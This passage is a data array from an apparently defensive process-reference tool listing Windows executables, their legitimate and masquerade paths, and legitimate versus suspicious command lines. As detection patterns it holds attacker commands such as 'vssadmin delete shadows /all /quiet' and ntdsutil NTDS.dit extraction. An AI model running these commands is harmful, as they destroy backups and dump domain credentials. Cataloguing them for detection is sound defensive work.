    commonMalwarePaths: ["C:\\Windows\\dwm.exe", "C:\\Users\\*\\dwm.exe", "C:\\Temp\\dwm.exe"],
    notes: "Runs per interactive session; only from System32. No network sockets.",
    category: "system",
    commandLinePatterns: { legitimate: ["dwm.exe"], suspicious: ["dwm.exe from non-system32 location"] },
  },
  {
    name: "wininit.exe",
    description: "Windows Initialization Process",
    legitimatePaths: ["C:\\Windows\\System32\\wininit.exe"],
    commonMalwarePaths: ["C:\\Windows\\wininit.exe", "C:\\Users\\*\\wininit.exe"],
    notes: "Critical boot process. Should only run from System32 during system startup.",
    category: "system",
  },
  {
    name: "services.exe",
    description: "Service Control Manager - manages Windows services",
    legitimatePaths: ["C:\\Windows\\System32\\services.exe"],
    commonMalwarePaths: ["C:\\Windows\\services.exe", "C:\\Users\\*\\services.exe"],
    notes: "Critical system process. Should only run from System32 with SYSTEM privileges.",
    category: "system",
  },
  {
    name: "smss.exe",
    description: "Session Manager Subsystem - session management",
    legitimatePaths: ["C:\\Windows\\System32\\smss.exe"],
    commonMalwarePaths: ["C:\\Windows\\smss.exe", "C:\\Users\\*\\smss.exe"],
    notes: "Critical system process. First user-mode process started by kernel.",
    category: "system",
  },
  {
    name: "firefox.exe",
    description: "Mozilla Firefox Browser",
    legitimatePaths: [
      "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
      "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
    ],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\firefox.exe", "C:\\Windows\\firefox.exe"],
    notes: "Web browser. Multiple processes are normal. Verify digital signature.",
    category: "browsers",
  },
  {
    name: "msedge.exe",
    description: "Microsoft Edge Browser",
    legitimatePaths: [
      "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
      "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
    ],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\msedge.exe", "C:\\Windows\\msedge.exe"],
    notes: "Microsoft's web browser. Multiple processes are normal for tabs and extensions.",
    category: "browsers",
  },
  {
    name: "winrar.exe",
    description: "WinRAR Archive Manager",
    legitimatePaths: ["C:\\Program Files\\WinRAR\\winrar.exe", "C:\\Program Files (x86)\\WinRAR\\winrar.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\*\\winrar.exe", "C:\\Windows\\winrar.exe"],
    notes: "Archive utility. Check digital signature if found in unusual locations.",
    category: "system",
  },
  {
    name: "spoolsv.exe",
    description: "Print Spooler Service",
    legitimatePaths: ["C:\\Windows\\System32\\spoolsv.exe"],
    commonMalwarePaths: ["C:\\Windows\\spoolsv.exe", "C:\\Users\\*\\spoolsv.exe"],
    notes: "Manages print jobs. Frequently targeted by privilege escalation exploits.",
    category: "system",
  },
  {
    name: "audiodg.exe",
    description: "Windows Audio Device Graph Isolation",
    legitimatePaths: ["C:\\Windows\\System32\\audiodg.exe"],
    commonMalwarePaths: ["C:\\Windows\\audiodg.exe", "C:\\Users\\*\\audiodg.exe"],
    notes: "Audio service isolation process. Should only run from System32.",
    category: "system",
  },
  {
    name: "conhost.exe",
    description: "Console Window Host - hosts console applications",
    legitimatePaths: ["C:\\Windows\\System32\\conhost.exe"],
    commonMalwarePaths: ["C:\\Windows\\conhost.exe", "C:\\Users\\*\\conhost.exe"],
    notes: "Console host process. Usually spawned by cmd.exe or PowerShell.",
    category: "system",
  },
  {
    name: "dllhost.exe",
    description: "COM Surrogate - hosts COM objects",
    legitimatePaths: ["C:\\Windows\\System32\\dllhost.exe", "C:\\Windows\\SysWOW64\\dllhost.exe"],
    commonMalwarePaths: ["C:\\Windows\\dllhost.exe", "C:\\Users\\*\\dllhost.exe"],
    notes: "Often abused; verify command line CLSID and parent.",
    category: "system",
    commandLinePatterns: {
      legitimate: ["dllhost.exe /Processid:{GUID}"],
      suspicious: ["dllhost.exe with arbitrary file paths", "dllhost.exe from non-system locations"],
    },
  },
  {
    name: "msiexec.exe",
    description: "Windows Installer Service",
    legitimatePaths: ["C:\\Windows\\System32\\msiexec.exe", "C:\\Windows\\SysWOW64\\msiexec.exe"],
    commonMalwarePaths: ["C:\\Windows\\msiexec.exe", "C:\\Users\\*\\msiexec.exe"],
    notes: "Windows Installer. Can be abused for malware installation. Monitor command line.",
    category: "admin",
  },
  {
    name: "regsvr32.exe",
    description: "Register Server - registers DLL files",
    legitimatePaths: ["C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\SysWOW64\\regsvr32.exe"],
    commonMalwarePaths: ["C:\\Windows\\regsvr32.exe", "C:\\Users\\*\\regsvr32.exe"],
    notes: "DLL registration utility. Frequently abused by malware for persistence.",
    category: "admin",
  },
  {
    name: "wuauclt.exe",
    description: "Windows Update AutoUpdate Client",
    legitimatePaths: ["C:\\Windows\\System32\\wuauclt.exe"],
    commonMalwarePaths: ["C:\\Windows\\wuauclt.exe", "C:\\Users\\*\\wuauclt.exe"],
    notes: "Windows Update client. Should only run from System32.",
    category: "system",
  },
  {
    name: "searchindexer.exe",
    description: "Microsoft Windows Search Indexer",
    legitimatePaths: ["C:\\Windows\\System32\\SearchIndexer.exe"],
    commonMalwarePaths: ["C:\\Windows\\SearchIndexer.exe", "C:\\Users\\*\\SearchIndexer.exe"],
    notes: "Windows Search service. High CPU usage is normal during indexing.",
    category: "system",
  },
  {
    name: "taskhostw.exe",
    description: "Task Host Process (Windows)",
    legitimatePaths: ["C:\\Windows\\System32\\taskhostw.exe"],
    commonMalwarePaths: ["C:\\Windows\\taskhostw.exe", "C:\\Users\\*\\taskhostw.exe"],
    notes: "Hosts scheduled tasks/COM handlers. Only from System32.",
    category: "system",
  },
  {
    name: "userinit.exe",
    description: "Windows User Initialization Process",
    legitimatePaths: ["C:\\Windows\\System32\\userinit.exe"],
    commonMalwarePaths: ["C:\\Windows\\userinit.exe", "C:\\Users\\*\\userinit.exe"],
    notes: "Critical user session initialization process. Runs once per user logon to set up the desktop environment.",
    category: "system",
    networkInfo: {
      ports: ["135 (RPC)", "445 (SMB)", "389 (LDAP)"],
      protocols: ["TCP", "RPC", "SMB", "LDAP"],
      connections: ["Domain controllers", "Group Policy servers", "Network shares"],
    },
    commandLinePatterns: {
      legitimate: ["C:\\Windows\\system32\\userinit.exe"],
      suspicious: [
        "userinit.exe with any command line parameters",
        "userinit.exe running multiple times per session",
        "userinit.exe from non-system32 location",
      ],
    },
  },
  {
    name: "ntdsutil.exe",
    description: "Active Directory Domain Services Utility",
    legitimatePaths: ["C:\\Windows\\System32\\ntdsutil.exe"],
    commonMalwarePaths: ["C:\\Windows\\ntdsutil.exe", "C:\\Users\\*\\ntdsutil.exe", "C:\\Temp\\ntdsutil.exe"],
    notes:
      "AD database management tool. Frequently used by attackers for credential dumping and AD reconnaissance. Monitor usage carefully.",
    category: "admin",
    commandLinePatterns: {
      legitimate: [
        'ntdsutil "activate instance ntds" ifm "create full c:\\backup" quit quit',
        'ntdsutil snapshot "activate instance ntds" create quit quit',
        'ntdsutil "set dsrm password" "reset password on server null" quit quit',
      ],
      suspicious: [
        "ntdsutil ifm create full (credential dumping)",
        "ntdsutil snapshot mount (accessing AD database)",
        'ntdsutil "ac i ntds" "ifm" "create full" (NTDS.dit extraction)',
        "ntdsutil with output to temp directories",
      ],
    },
  },
  {
    name: "vssadmin.exe",
    description: "Volume Shadow Copy Service Administration Tool",
    legitimatePaths: ["C:\\Windows\\System32\\vssadmin.exe"],
    commonMalwarePaths: ["C:\\Windows\\vssadmin.exe", "C:\\Users\\*\\vssadmin.exe", "C:\\Temp\\vssadmin.exe"],
    notes:
      "VSS management utility. Commonly abused by ransomware to delete shadow copies and by attackers for credential access.",
    category: "admin",
    networkInfo: {
      ports: ["No direct network activity"],
      protocols: ["Local system calls"],
      connections: ["Volume Shadow Copy Service", "Local disk volumes"],
    },
    commandLinePatterns: {
      legitimate: [
        "vssadmin list shadows",
        "vssadmin list providers",
        "vssadmin create shadow /for=C:",
        "vssadmin list writers",
      ],
      suspicious: [
        "vssadmin delete shadows /all /quiet (ransomware behavior)",
        "vssadmin delete shadows /for=C: /quiet",
        "vssadmin resize shadowstorage /maxsize=UNBOUNDED",
        "vssadmin create shadow combined with ntdsutil (credential dumping)",
      ],
    },
  },
  {
    name: "powerpnt.exe",
    description: "Microsoft PowerPoint",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft Office\\*\\POWERPNT.EXE",
      "C:\\Program Files (x86)\\Microsoft Office\\*\\POWERPNT.EXE",
    ],
    commonMalwarePaths: [
      "C:\\Users\\*\\AppData\\*\\powerpnt.exe",
      "C:\\Windows\\powerpnt.exe",
      "C:\\Temp\\powerpnt.exe",
    ],
    notes:
      "Microsoft PowerPoint presentation software. Monitor for malicious macros and embedded objects in presentations.",
    category: "office",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)", "Various high ports"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Office 365 services", "SharePoint servers", "Template repositories"],
    },
    commandLinePatterns: {
      legitimate: ["powerpnt.exe /s presentation.pptx", "powerpnt.exe presentation.ppt"],
      suspicious: [
        "powerpnt.exe with embedded macro execution",
        "powerpnt.exe /automation (COM automation abuse)",
        "powerpnt.exe with suspicious file paths or URLs",
      ],
    },
  },
  {
    name: "winword.exe",
    description: "Microsoft Word",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
    ],
    commonMalwarePaths: [
      "C:\\Windows\\System32\\winword.exe",
      "C:\\Users\\*\\AppData\\*\\winword.exe",
      "C:\\Temp\\winword.exe",
    ],
    notes:
      "Microsoft Word. One of the most common malware vectors via malicious macros, embedded objects, and DDE attacks. Monitor for unexpected child processes, especially scripting engines and LOLBins.",
    category: "office",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)", "Various high ports"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Office 365 services", "SharePoint servers", "Template repositories"],
    },
    commandLinePatterns: {
      legitimate: ["winword.exe document.docx", "winword.exe /safe", "winword.exe /m"],
      suspicious: [
        "winword.exe with embedded macro execution",
        "winword.exe /automation (COM automation abuse)",
        "winword.exe spawning cmd.exe or powershell.exe",
      ],
    },
    childProcesses: {
      common: ["officeclicktorun.exe", "msosync.exe", "riched20.dll"],
      suspicious: ["cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe", "bash.exe", "pwsh.exe"],
    },
  },
  {
    name: "excel.exe",
    description: "Microsoft Excel",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
      "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
      "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
    ],
    commonMalwarePaths: [
      "C:\\Windows\\System32\\excel.exe",
      "C:\\Users\\*\\AppData\\*\\excel.exe",
      "C:\\Temp\\excel.exe",
    ],
    notes:
      "Microsoft Excel. Frequently abused for macro-based malware, XLM (Excel 4.0) macros, and DDE attacks. Excel 4.0 XLM macros are a growing threat vector that bypass many security controls.",
    category: "office",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)", "Various high ports"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Office 365 services", "SharePoint servers", "Data sources"],
    },
    commandLinePatterns: {
      legitimate: ["excel.exe workbook.xlsx", "excel.exe /safe", "excel.exe /automation"],
      suspicious: [
        "excel.exe with XLM macro execution",
        "excel.exe /automation (COM automation abuse)",
        "excel.exe spawning cmd.exe or powershell.exe",
      ],
    },
    childProcesses: {
      common: ["officeclicktorun.exe", "msosync.exe"],
      suspicious: ["cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe", "bash.exe", "pwsh.exe"],
    },
  },
  {
    name: "code.exe",
    description: "Visual Studio Code",
    legitimatePaths: [
      "C:\\Users\\*\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
      "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\System32\\code.exe", "C:\\Temp\\code.exe", "C:\\Windows\\code.exe"],
    notes:
      "Visual Studio Code editor. Monitor for suspicious extensions and terminal usage. Popular target for supply chain attacks.",
    category: "admin",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)", "Various high ports for extensions"],
      protocols: ["TCP", "HTTP", "HTTPS", "WebSocket"],
      connections: ["GitHub", "Extension marketplace", "Language servers", "Remote development servers"],
    },
    commandLinePatterns: {
      legitimate: ["code.exe .", "code.exe --install-extension", "code.exe --list-extensions"],
      suspicious: [
        "code.exe --disable-extensions (security bypass)",
        "code.exe with suspicious workspace paths",
        "code.exe --enable-proposed-api with untrusted extensions",
      ],
    },
  },
  {
    name: "vmware.exe",
    description: "VMware Workstation",
    legitimatePaths: [
      "C:\\Program Files (x86)\\VMware\\VMware Workstation\\vmware.exe",
      "C:\\Program Files\\VMware\\VMware Workstation\\vmware.exe",
    ],
    commonMalwarePaths: [
      "C:\\Windows\\System32\\vmware.exe",
      "C:\\Users\\*\\AppData\\*\\vmware.exe",
      "C:\\Temp\\vmware.exe",
    ],
    notes: "VMware Workstation virtualization software. Monitor for VM escape attempts and unauthorized VM creation.",
    category: "admin",
    networkInfo: {
      ports: ["443 (HTTPS)", "902 (VMware Auth)", "903 (VMware Console)"],
      protocols: ["TCP", "HTTPS", "VMware proprietary"],
      connections: ["VMware vCenter", "ESXi hosts", "VM network adapters"],
    },
    commandLinePatterns: {
      legitimate: ["vmware.exe", "vmware.exe -X vm.vmx", "vmware.exe -T ws vm.vmx"],
      suspicious: [
        "vmware.exe with suspicious VM paths",
        "vmware.exe -X with network-accessible VMs",
        "vmware.exe launched from unusual parent processes",
      ],
    },
  },
  {
    name: "vmware-vmx.exe",
    description: "VMware Virtual Machine Executable",
    legitimatePaths: [
      "C:\\Program Files (x86)\\VMware\\VMware Workstation\\x64\\vmware-vmx.exe",
      "C:\\Program Files\\VMware\\VMware Workstation\\x64\\vmware-vmx.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\System32\\vmware-vmx.exe", "C:\\Users\\*\\vmware-vmx.exe"],
    notes:
      "VMware VM execution engine. Each running VM spawns this process. Monitor for resource usage and network activity.",
    category: "admin",
    networkInfo: {
      ports: ["Various VM network ports", "NAT/Bridged network ranges"],
      protocols: ["TCP", "UDP", "VM network protocols"],
      connections: ["VM network adapters", "Host network interfaces", "VM-to-VM communication"],
    },
    commandLinePatterns: {
      legitimate: ["vmware-vmx.exe -# product=ws;name=VMware Workstation;version=..."],
      suspicious: [
        "vmware-vmx.exe with suspicious VM configuration paths",
        "vmware-vmx.exe with modified security settings",
      ],
    },
  },
  {
    name: "wt.exe",
    description: "Windows Terminal",
    legitimatePaths: [
      "C:\\Users\\*\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe",
      "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_*\\wt.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\System32\\wt.exe", "C:\\Windows\\wt.exe", "C:\\Temp\\wt.exe"],
    notes: "Modern Windows terminal application. Monitor for suspicious shell spawning and command execution patterns.",
    category: "admin",
    networkInfo: {
      ports: ["22 (SSH)", "Various ports for remote connections"],
      protocols: ["TCP", "SSH", "WSL networking"],
      connections: ["SSH servers", "WSL instances", "Remote development environments"],
    },
    commandLinePatterns: {
      legitimate: ["wt.exe", "wt.exe -p PowerShell", "wt.exe new-tab -p cmd"],
      suspicious: [
        "wt.exe with encoded commands",
        "wt.exe spawning suspicious child processes",
        "wt.exe with hidden window parameters",
      ],
    },
  },
  {
    name: "adobearm.exe",
    description: "Adobe Acrobat and Reader Manager",
    legitimatePaths: ["C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\*\\AdobeARM.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\adobearm.exe", "C:\\Users\\*\\AppData\\*\\adobearm.exe"],
    notes: "Adobe update service. Should only run from Adobe installation directory.",
    category: "system",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Adobe update servers"],
    },
  },
  {
    name: "applemobiledeviceservice.exe",
    description: "Apple Mobile Device Service",
    legitimatePaths: ["C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\\AppleMobileDeviceService.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\applemobiledeviceservice.exe"],
    notes: "Apple iTunes/iPhone support service. Should only run from Apple installation directory.",
    category: "system",
    networkInfo: {
      ports: ["62078 (iTunes)", "Various USB ports"],
      protocols: ["TCP", "USB"],
      connections: ["iOS devices", "iTunes services"],
    },
  },
  {
    name: "app_updater.exe",
    description: "Generic Application Updater",
    legitimatePaths: ["Various application directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\app_updater.exe", "C:\\Temp\\app_updater.exe"],
    notes: "Generic updater name. Verify digital signature and parent application.",
    category: "system",
  },
  {
    name: "armsvc.exe",
    description: "Adobe Acrobat Update Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\*\\armsvc.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\armsvc.exe"],
    notes: "Adobe Reader/Acrobat update service. Should run as Windows service.",
    category: "system",
  },
  {
    name: "ascservice.exe",
    description: "Advanced SystemCare Service",
    legitimatePaths: ["C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ascservice.exe"],
    notes: "IObit Advanced SystemCare optimization tool service.",
    category: "system",
  },
  {
    name: "asctray.exe",
    description: "Advanced SystemCare Tray",
    legitimatePaths: ["C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCTray.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\asctray.exe"],
    notes: "IObit Advanced SystemCare system tray application.",
    category: "system",
  },
  {
    name: "assysctrlservice.exe",
    description: "ASUS System Control Service",
    legitimatePaths: ["C:\\Program Files (x86)\\ASUS\\*\\AssysCtrlService.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\assysctrlservice.exe"],
    notes: "ASUS system control and monitoring service.",
    category: "system",
  },
  {
    name: "atieclxx.exe",
    description: "AMD External Events Utility",
    legitimatePaths: ["C:\\Windows\\System32\\atieclxx.exe"],
    commonMalwarePaths: ["C:\\Windows\\atieclxx.exe", "C:\\Users\\*\\atieclxx.exe"],
    notes: "AMD graphics driver component. Should only run from System32.",
    category: "system",
  },
  {
    name: "atiesrxx.exe",
    description: "AMD External Events Service",
    legitimatePaths: ["C:\\Windows\\System32\\atiesrxx.exe"],
    commonMalwarePaths: ["C:\\Windows\\atiesrxx.exe", "C:\\Users\\*\\atiesrxx.exe"],
    notes: "AMD graphics driver service. Should only run from System32.",
    category: "system",
  },
  {
    name: "atkexcomsvc.exe",
    description: "ASUS ATK Package Service",
    legitimatePaths: ["C:\\Program Files (x86)\\ASUS\\ATK Package\\*\\ATKEXCOMSVC.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\atkexcomsvc.exe"],
    notes: "ASUS ATK hotkey and system control service.",
    category: "system",
  },
  {
    name: "avastsvc.exe",
    description: "Avast Antivirus Service",
    legitimatePaths: ["C:\\Program Files\\AVAST Software\\Avast\\avastsvc.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\avastsvc.exe"],
    notes: "Avast antivirus background service. Critical security component.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "Various update ports"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Avast update servers", "Cloud security services"],
    },
  },
  {
    name: "avastui.exe",
    description: "Avast Antivirus User Interface",
    legitimatePaths: ["C:\\Program Files\\AVAST Software\\Avast\\avastui.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\avastui.exe"],
    notes: "Avast antivirus user interface and system tray component.",
    category: "security",
  },
  {
    name: "avgwdsvca.exe",
    description: "AVG Web TuneUp Service",
    legitimatePaths: ["C:\\Program Files (x86)\\AVG\\*\\avgwdsvcx.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\avgwdsvca.exe"],
    notes: "AVG antivirus web protection service component.",
    category: "security",
  },
  {
    name: "ccleaner64.exe",
    description: "CCleaner System Cleaner (64-bit)",
    legitimatePaths: ["C:\\Program Files\\CCleaner\\CCleaner64.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ccleaner64.exe", "C:\\Temp\\ccleaner64.exe"],
    notes: "Piriform CCleaner system optimization tool. Monitor for supply chain attacks.",
    category: "admin",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["CCleaner update servers", "Telemetry services"],
    },
  },
  {
    name: "dcshelper.exe",
    description: "Dell Command Suite Helper",
    legitimatePaths: ["C:\\Program Files (x86)\\Dell\\*\\DCSHelper.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\dcshelper.exe"],
    notes: "Dell system management utility helper process.",
    category: "system",
  },
  {
    name: "discord.exe",
    description: "Discord Communication Platform",
    legitimatePaths: ["C:\\Users\\*\\AppData\\Local\\Discord\\*\\Discord.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\discord.exe", "C:\\Temp\\discord.exe"],
    notes: "Discord voice and text chat application. Multiple processes normal.",
    category: "system",
    networkInfo: {
      ports: ["443 (HTTPS)", "Various voice ports"],
      protocols: ["TCP", "UDP", "HTTPS", "WebRTC"],
      connections: ["Discord servers", "Voice channels", "CDN networks"],
    },
  },
  {
    name: "esif_assist_64.exe",
    description: "Intel Dynamic Platform and Thermal Framework",
    legitimatePaths: ["C:\\Windows\\System32\\esif_assist_64.exe"],
    commonMalwarePaths: ["C:\\Windows\\esif_assist_64.exe", "C:\\Users\\*\\esif_assist_64.exe"],
    notes: "Intel thermal management service. Should only run from System32.",
    category: "system",
  },
  {
    name: "fuel.service.exe",
    description: "AMD Fuel Service",
    legitimatePaths: ["C:\\Program Files\\ATI Technologies\\ATI.ACE\\Fuel\\Fuel.Service.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\fuel.service.exe"],
    notes: "AMD Catalyst Control Center service component.",
    category: "system",
  },
  {
    name: "googlecrashhandler.exe",
    description: "Google Crash Handler (32-bit)",
    legitimatePaths: ["C:\\Program Files (x86)\\Google\\*\\GoogleCrashHandler.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\googlecrashhandler.exe"],
    notes: "Google application crash reporting service.",
    category: "system",
  },
  {
    name: "googlecrashhandler64.exe",
    description: "Google Crash Handler (64-bit)",
    legitimatePaths: ["C:\\Program Files\\Google\\*\\GoogleCrashHandler64.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\googlecrashhandler64.exe"],
    notes: "Google application crash reporting service (64-bit).",
    category: "system",
  },
  {
    name: "googleupdate.exe",
    description: "Google Update Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\googleupdate.exe"],
    notes: "Google applications update service. Manages Chrome and other Google software updates.",
    category: "system",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Google update servers"],
    },
  },
  {
    name: "hipatchservice.exe",
    description: "HiPatch Update Service",
    legitimatePaths: ["Various game installation directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\hipatchservice.exe"],
    notes: "Game update service used by various gaming platforms.",
    category: "system",
  },
  {
    name: "hostappserviceupdater.exe",
    description: "Host App Service Updater",
    legitimatePaths: ["Various application directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\hostappserviceupdater.exe"],
    notes: "Generic application service updater. Verify parent application.",
    category: "system",
  },
  {
    name: "hsmgr.exe",
    description: "Hotkey Manager (32-bit)",
    legitimatePaths: ["Various system utility directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\hsmgr.exe"],
    notes: "System hotkey management utility.",
    category: "system",
  },
  {
    name: "hsmgr64.exe",
    description: "Hotkey Manager (64-bit)",
    legitimatePaths: ["Various system utility directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\hsmgr64.exe"],
    notes: "System hotkey management utility (64-bit).",
    category: "system",
  },
  {
    name: "hwdeviceservice64.exe",
    description: "Hardware Device Service (64-bit)",
    legitimatePaths: ["Various hardware vendor directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\hwdeviceservice64.exe"],
    notes: "Hardware device management service. Verify vendor and digital signature.",
    category: "system",
  },
  {
    name: "iastordatamgrsvc.exe",
    description: "Intel Rapid Storage Technology Data Manager",
    legitimatePaths: ["C:\\Program Files\\Intel\\Intel(R) Rapid Storage Technology\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\iastordatamgrsvc.exe"],
    notes: "Intel storage management service component.",
    category: "system",
  },
  {
    name: "iastoricon.exe",
    description: "Intel Rapid Storage Technology Icon",
    legitimatePaths: ["C:\\Program Files\\Intel\\Intel(R) Rapid Storage Technology\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\iastoricon.exe"],
    notes: "Intel storage technology system tray icon.",
    category: "system",
  },
  {
    name: "iemonitor.exe",
    description: "Internet Explorer Monitor",
    legitimatePaths: ["C:\\Program Files\\Internet Explorer\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\iemonitor.exe"],
    notes: "Internet Explorer monitoring and management component.",
    category: "browsers",
  },
  {
    name: "igfxcuiservice.exe",
    description: "Intel Graphics Common User Interface Service",
    legitimatePaths: ["C:\\Windows\\System32\\igfxCUIService.exe"],
    commonMalwarePaths: ["C:\\Windows\\igfxcuiservice.exe"],
    notes: "Intel graphics driver user interface service.",
    category: "system",
  },
  {
    name: "igfxem.exe",
    description: "Intel Graphics Event Monitor",
    legitimatePaths: ["C:\\Windows\\System32\\igfxEM.exe"],
    commonMalwarePaths: ["C:\\Windows\\igfxem.exe"],
    notes: "Intel graphics driver event monitoring process.",
    category: "system",
  },
  {
    name: "igfxpers.exe",
    description: "Intel Graphics Persistence Module",
    legitimatePaths: ["C:\\Windows\\System32\\igfxpers.exe"],
    commonMalwarePaths: ["C:\\Windows\\igfxpers.exe"],
    notes: "Intel graphics driver persistence module.",
    category: "system",
  },
  {
    name: "igfxsrvc.exe",
    description: "Intel Graphics Service",
    legitimatePaths: ["C:\\Windows\\System32\\igfxsrvc.exe"],
    commonMalwarePaths: ["C:\\Windows\\igfxsrvc.exe"],
    notes: "Intel graphics driver service component.",
    category: "system",
  },
  {
    name: "igfxtray.exe",
    description: "Intel Graphics System Tray",
    legitimatePaths: ["C:\\Windows\\System32\\igfxtray.exe"],
    commonMalwarePaths: ["C:\\Windows\\igfxtray.exe"],
    notes: "Intel graphics driver system tray application.",
    category: "system",
  },
  {
    name: "isuspm.exe",
    description: "InstallShield Update Service Manager",
    legitimatePaths: ["C:\\Program Files\\Common Files\\InstallShield\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\isuspm.exe"],
    notes: "InstallShield software update manager.",
    category: "system",
  },
  {
    name: "iusb3mon.exe",
    description: "Intel USB 3.0 Monitor",
    legitimatePaths: ["C:\\Program Files\\Intel\\Intel(R) USB 3.0 eXtensible Host Controller Driver\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\iusb3mon.exe"],
    notes: "Intel USB 3.0 driver monitoring utility.",
    category: "system",
  },
  {
    name: "jhi_service.exe",
    description: "Intel Dynamic Application Loader Host Interface Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\jhi_service.exe"],
    notes: "Intel Management Engine component service.",
    category: "system",
  },
  {
    name: "kms-r@1n.exe",
    description: "Suspicious KMS Activator",
    legitimatePaths: ["None - likely malicious"],
    commonMalwarePaths: ["C:\\Windows\\System32\\kms-r@1n.exe", "C:\\Temp\\kms-r@1n.exe"],
    notes: "Likely pirated software KMS activator. High probability of malware.",
    category: "security",
  },
  {
    name: "kmservice.exe",
    description: "KMS Service (Potentially Suspicious)",
    legitimatePaths: ["Legitimate KMS servers only"],
    commonMalwarePaths: ["C:\\Windows\\System32\\kmservice.exe", "C:\\Temp\\kmservice.exe"],
    notes: "Could be legitimate KMS or pirated software activator. Investigate context.",
    category: "security",
  },
  {
    name: "kmsss.exe",
    description: "KMS Service (Potentially Suspicious)",
    legitimatePaths: ["Legitimate KMS servers only"],
    commonMalwarePaths: ["C:\\Windows\\System32\\kmsss.exe", "C:\\Temp\\kmsss.exe"],
    notes: "Could be legitimate KMS or pirated software activator. Investigate context.",
    category: "security",
  },
  {
    name: "livecomm.exe",
    description: "Windows Live Communications Platform",
    legitimatePaths: ["C:\\Program Files\\WindowsApps\\*\\LiveComm.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\livecomm.exe"],
    notes: "Windows 10/11 Mail and Calendar app communication component.",
    category: "system",
  },
  {
    name: "lms.exe",
    description: "Intel Local Management Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\lms.exe"],
    notes: "Intel Management Engine local management service.",
    category: "system",
  },
  {
    name: "logioptionsmgr.exe",
    description: "Logitech Options Manager",
    legitimatePaths: ["C:\\Program Files\\Logitech\\LogiOptions\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\logioptionsmgr.exe"],
    notes: "Logitech mouse and keyboard configuration manager.",
    category: "system",
